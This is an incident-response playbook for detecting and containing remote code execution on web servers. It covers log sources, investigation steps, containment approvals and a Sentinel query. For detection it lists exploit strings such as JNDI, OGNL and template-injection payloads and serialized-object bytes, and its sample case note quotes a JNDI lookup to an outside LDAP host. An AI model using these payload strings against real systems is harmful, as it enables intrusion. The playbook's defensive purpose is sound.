# Playbook: Remote Code Execution (RCE)

## Playbook ID & Name

**WEB-012** — Remote Code Execution Against Public-Facing Web Application

Category: Web Security. Applies to any internet-facing or internal web application, API, or middleware component (Java/Tomcat/WebLogic, .NET/IIS, PHP, Node.js) where an attacker can get the server itself to run arbitrary code — via insecure deserialization, expression-language/template injection (SSTI/OGNL), a vulnerable third-party library or plugin (Log4j-style JNDI injection, Struts2 OGNL, Spring4Shell, Confluence/Atlassian CVEs, vulnerable CMS plugins), or an unrestricted file upload that gets executed by the web server.

## Business Risk

**[STAKEHOLDER]** - RCE is the ceiling of web application risk. Everything else in this category (SQLi, XSS, path traversal) is about getting *data out*; RCE is about getting *control of the box*. Once an attacker can run their own commands on a web server, they own that server's identity, its network position, and everything it can reach — databases, internal shares, other services on the same segment. This is the one class of web alert where "wait for the next change window" is not an acceptable answer; a confirmed RCE on a production host is a same-hour containment decision, not a ticket.

## Severity / Priority Default

**Critical** at trigger for any alert where a shell or interpreter process was spawned by a web server/application process, or a webshell file was written to a web-accessible directory. **High** for a confirmed exploit *attempt* (payload matched known RCE signature) with no confirmed execution yet — this can still be escalated to Critical within minutes once host telemetry is reviewed, so don't sit on it. Downgrade only after an analyst confirms the payload never reached a vulnerable code path (blocked pre-execution, patched component, or parameterized/sandboxed handling).

## MITRE ATT&CK Techniques

| ID | Technique | Where it fits |
|---|---|---|
| T1595 | Active Scanning | Mass scanning for known-vulnerable endpoints/CVEs (Log4j JNDI probes, Struts2 OGNL fuzzing) before a targeted attempt |
| T1190 | Exploit Public-Facing Application | The RCE itself — this is the core technique this playbook exists to catch |
| T1059.001 / T1059.003 | Command and Scripting Interpreter (PowerShell / Windows Command Shell) | Post-exploitation command execution spawned by the compromised web process |
| T1105 | Ingress Tool Transfer | Second-stage payload, webshell, or attacker tooling pulled down after initial code execution |
| T1027 | Obfuscated Files or Information | Base64/hex-encoded command lines, encoded JNDI/OGNL payloads used to dodge signature matching |
| T1552.001 | Unsecured Credentials: Credentials In Files | Attacker reads `web.config`, `.env`, connection strings, or app secrets immediately after landing code execution |
| T1071.004 | Application Layer Protocol: DNS | Out-of-band callback confirmation — classic Log4Shell/JNDI pattern where the payload triggers a DNS lookup to an attacker-controlled or canary domain |

## Trigger / Detection Logic Summary

Alert fires on any of: (1) WAF/IPS signature match for known RCE payload classes (JNDI lookup strings, OGNL/SSTI expression syntax, Java serialization magic bytes, suspicious multipart upload followed by execution of the uploaded file); (2) a web server or application process (`w3wp.exe`, `java`, `httpd`, `nginx`, `php-fpm`, `tomcat*`) spawning a command interpreter or scripting engine as a child process — this is the single highest-fidelity signal in this playbook and should page regardless of WAF disposition; (3) a new script/executable file appearing in a web-accessible directory with no corresponding deployment record; (4) outbound DNS or network connections from an application server to an unfamiliar external host within seconds of a matching request. Correlate all four where possible — a WAF match alone is noise, a WAF match followed by a process spawn is an incident.

## Required Log Sources & Event IDs

The load-bearing signal here is **process creation and parent-child lineage telemetry**: Sysmon Event ID 1 (Process Create) if Sysmon is deployed, or Windows Security Event ID 4688 (Process Creation, requires the Audit Process Creation subcategory enabled, plus the "Include command line in process creation events" policy for full command-line capture) as the native fallback. Either way, pivot on process name and parent-process name (web server process as parent of a shell/interpreter) — the ID just tells you which pipe to pull the data from.

| Source | What to pull |
|---|---|
| WAF / IPS | Rule match, action (block/log/pass), matched payload, transaction ID, source IP/ASN |
| Web/app server access + error log (IIS, Tomcat catalina.out, Apache/Nginx) | Full request (headers + body), status code, response size, stack traces leaking class/library names |
| EDR / Sysmon process-creation telemetry (host) | Parent process, child process, full command line, spawning account |
| EDR network-connection telemetry (host) | Outbound connections from the web process, destination IP/port, first-seen indicators |
| DNS logs (recursive resolver) | Lookups from the app server to unfamiliar/high-entropy or known canary domains (e.g. `*.dnslog.cn`, `*.interact.sh`, `*.burpcollaborator.net`) |
| File integrity monitoring / web root diff | New or modified files under web-accessible paths, timestamp vs. last known deployment |
| Vulnerability scan results / asset inventory | Confirms whether the targeted app/library/CVE was actually present and unpatched |

## Key Fields to Inspect

**[ANALYST]**
- **Raw request body/headers** — `User-Agent`, `X-Forwarded-For`, `Referer`, and custom headers are common delivery vectors for JNDI/OGNL payloads (Log4Shell taught everyone that headers get logged and parsed too); decode before dismissing
- **Content-Type / body bytes** — Java serialized stream magic bytes (`AC ED 00 05`) in a request body is close to a guaranteed deserialization attempt, not a coincidence
- **Parent process → child process** — `w3wp.exe`/`java`/`httpd` spawning `cmd.exe`, `powershell.exe`, `sh`, `bash`, or `whoami`/`id`/`uname` is abnormal in essentially every production environment; treat as a hard signal
- **Command line of spawned process** — decode base64/hex, check for `Invoke-Expression`, `IEX`, `curl|wget` piped to a shell, or LOLBin invocation
- **Web root file listing** — new `.jsp`/`.aspx`/`.php` file with a recent mtime and no matching deploy ticket is a webshell until proven otherwise
- **Outbound destination** — first-seen external IP/domain from that host in the minutes following the request; cross-reference the payload's embedded LDAP/RMI/HTTP host if the exploit class carries one
- **Executing account context** — is the web process running as a scoped low-privilege identity (IIS AppPool identity, `www-data`, `nobody`) or something with broader rights? Scope of damage differs enormously

## Normal vs Suspicious Pattern

| Normal | Suspicious |
|---|---|
| Web/app server process never spawns a shell or scripting interpreter | Web/app process spawns `cmd.exe`, `powershell.exe`, `sh`, or similar |
| Request headers/body contain expected data shapes for the endpoint | Headers/body contain `${jndi:`, `${ognl`, `{{7*7}}`, `<%eval`, ysoserial gadget class names (`org.apache.commons.collections`), or serialized-object magic bytes |
| App writes only to designated upload/log/cache directories | New executable script appears directly under the public web root |
| Outbound connections limited to known DB/cache/API endpoints on the app segment | Outbound connection or DNS lookup to an unfamiliar external host immediately after a request |
| Vulnerable library/CVE either absent or already patched per asset inventory | Confirmed-present, unpatched version of a library with a known deserialization/OGNL/JNDI CVE |

## Investigation Steps

1. Pull the full raw request (headers + body) for the triggering event and decode any URL/Base64/hex/Unicode encoding — confirm the actual payload shape (JNDI, OGNL, SSTI, serialized object, malicious upload).
2. Identify whether the payload maps to a known, named vulnerability class or CVE against the targeted component, and check the asset inventory / patch level for that exact library and version.
3. Pivot immediately to EDR/Sysmon process-creation telemetry for the web server host at that timestamp — did the web/app process spawn a child process, and what's the exact command line?
4. Diff the web root and any writable directories against the last known-good deployment for new or modified files (webshell check) around the alert window.
5. Review outbound network and DNS activity from the host in the minutes following the request — look for callbacks to attacker infrastructure or canary/OOB-detection domains matching a hostname embedded in the payload.
6. Determine the execution context — what account is the process running under, and did any spawned process attempt privilege escalation or credential access (LSASS access, config file reads)?
7. Check for lateral movement indicators from this host — new SMB/RDP/WinRM/SSH connections to internal systems that aren't part of its normal baseline traffic pattern.
8. Determine blast radius — is this a single probe against one endpoint (likely mass-scanning noise), or the same signature/payload hitting multiple hosts in your estate (active mass-exploitation campaign)?

## True Positive Indicators

- Web/app server process confirmed spawning a shell or interpreter with an attacker-supplied command line
- Webshell file present in a web-accessible directory, created or modified by the web server process's own account, with no matching deployment record
- Outbound callback (DNS, LDAP, RMI, or HTTP) to attacker infrastructure matching a hostname embedded in the exploit payload
- Vulnerable, unpatched version of the targeted library/component confirmed present in the asset inventory
- Process telemetry shows recon commands (`whoami`, `id`, `uname -a`, `systeminfo`, `ipconfig`) executed immediately after the triggering request

## False Positive / Benign Positive Indicators

- Authorized vulnerability scanner or pentest engagement sending exploit-verification payloads with no real callback infrastructure behind them — check the scan/pentest calendar before escalating
- WAF matched benign syntax that coincidentally resembles a payload (e.g., a legitimate Spring `${...}` property placeholder value, or literal text in a support ticket body containing exploit strings for documentation purposes)
- Scheduled CI/CD deployment writing new files to the web root at the same timestamp — correlate against the change/release ticket before calling it a webshell
- Your own internal Log4j/OGNL vulnerability scanner or canary-token service triggering the DNS callback detection you're now investigating

## Escalation Criteria

Escalate to Incident Response immediately on: any confirmed process spawn from an internet-facing web/app process; a webshell found on any host; a confirmed outbound callback to attacker infrastructure; evidence of credential harvesting or lateral movement following the exploit; the affected host holding regulated data or database connectivity; or the same signature appearing against more than one host (treat as active mass-exploitation, not an isolated incident).

## Containment Options & Approval Authority

**[MANAGEMENT]**

| Action | Approval needed | Notes |
|---|---|---|
| WAF virtual patch / block rule for the specific payload pattern or CVE | SOC Tier 2 (standing authority) | Fastest stopgap while the real fix is scheduled |
| Kill the malicious spawned process on the host | SOC Tier 2 / on-call engineering | Buys time but does not remove persistence — treat as first step only |
| Remove webshell file, rotate any credentials it could have read | IR lead + app owner | Required once a webshell is confirmed |
| Isolate host from network (EDR network containment) | IR lead + infrastructure owner (Sev-1 bridge) | Standard for confirmed active exploitation with outbound callback |
| Take host offline / rebuild from known-good image | IR lead + infra + business owner sign-off | Reserved for confirmed compromise with uncertain persistence scope; production outage decision |
| Patch/upgrade the vulnerable library or component | Engineering management, tracked as a change ticket | Root-cause fix; always follows containment, never substitutes for it |

## Example Query (Microsoft Sentinel KQL)

```kql
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("w3wp.exe","java.exe","httpd.exe","php-cgi.exe","tomcat9.exe")
| where FileName in~ ("cmd.exe","powershell.exe","sh","bash","whoami.exe","certutil.exe")
| project Timestamp, DeviceName, InitiatingProcessFileName, FileName,
          ProcessCommandLine, AccountName
| order by Timestamp desc
```

## Closure Criteria

Close as **True Positive** once the exploit path is confirmed blocked (WAF virtual patch, patched library, or removed vulnerable feature), any webshell/dropped tooling is removed, affected credentials are rotated, and the host has been reviewed for further persistence with nothing found. Close as **Benign Positive** when the matched payload is confirmed to be authorized scan/pentest traffic or a coincidental string match with no execution. Close as **Insufficient Evidence** when process-creation telemetry wasn't available for the host during the alert window and execution can't be confirmed either way — log this as a telemetry-coverage gap for Engineering rather than letting it quietly close clean.

**Example case note:**
`2026-09-15 21:47 UTC — WAF alert on app02.example.com (10.20.4.15) for inbound POST to /api/render containing "${jndi:ldap://185.199.108.1x.example.net/a}" in X-Forwarded-For header. Pivoted to EDR: java.exe (Tomcat, PID 4412) spawned no child process in the 10-min window following the request; outbound DNS log shows one lookup to the embedded LDAP host, resolver returned NXDOMAIN, no outbound LDAP/RMI connection completed. Log4j version on this app confirmed patched to 2.17.1 per asset inventory (patched February 2026 per change record CR-2291). No file changes in web root. Closing as Benign Positive — blocked by patched library, no execution; recommending WAF rule remain in blocking mode given continued internet-wide scanning for this CVE class.`
